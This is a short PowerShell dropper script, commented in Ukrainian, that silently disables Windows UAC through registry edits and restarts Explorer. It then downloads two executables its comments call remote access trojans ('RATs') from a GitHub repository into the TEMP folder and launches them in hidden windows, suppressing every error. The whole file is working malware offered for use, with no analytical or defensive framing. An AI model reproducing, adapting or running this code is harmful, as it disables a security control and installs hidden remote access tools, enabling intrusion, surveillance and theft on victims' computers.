# KRA SCRIPT - ВИМИКАННЯ UAC, ПЕРЕЗАПУСК EXPLORER, ЗАГРУЗКА ТА ЗАПУСК 2 РАТОК

# 1. ВИМИКАЄМО UAC (БЕЗ ПОВІДОМЛЕНЬ)
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
} catch { }

# 2. ПЕРЕЗАПУСКАЄМО EXPLORER
try {
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    Start-Process -FilePath "explorer.exe" -ErrorAction SilentlyContinue
} catch { }

# 3. ЗАГРУЗКА 2 РАТОК
$rat1 = "$env:TEMP\ShellBag.exe"
$rat2 = "$env:TEMP\Base.exe"

try {
    Invoke-WebRequest -Uri "https://github.com/sys1e/catl/raw/refs/heads/main/ShellBag.exe" -OutFile $rat1 -UseBasicParsing -ErrorAction SilentlyContinue
    Invoke-WebRequest -Uri "https://github.com/sys1e/catl/raw/refs/heads/main/Base.exe" -OutFile $rat2 -UseBasicParsing -ErrorAction SilentlyContinue
} catch { }

# 4. ЗАПУСК РАТОК (СКРИТО)
try {
    Start-Process -FilePath $rat1 -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Process -FilePath $rat2 -WindowStyle Hidden -ErrorAction SilentlyContinue
} catch { }

Exit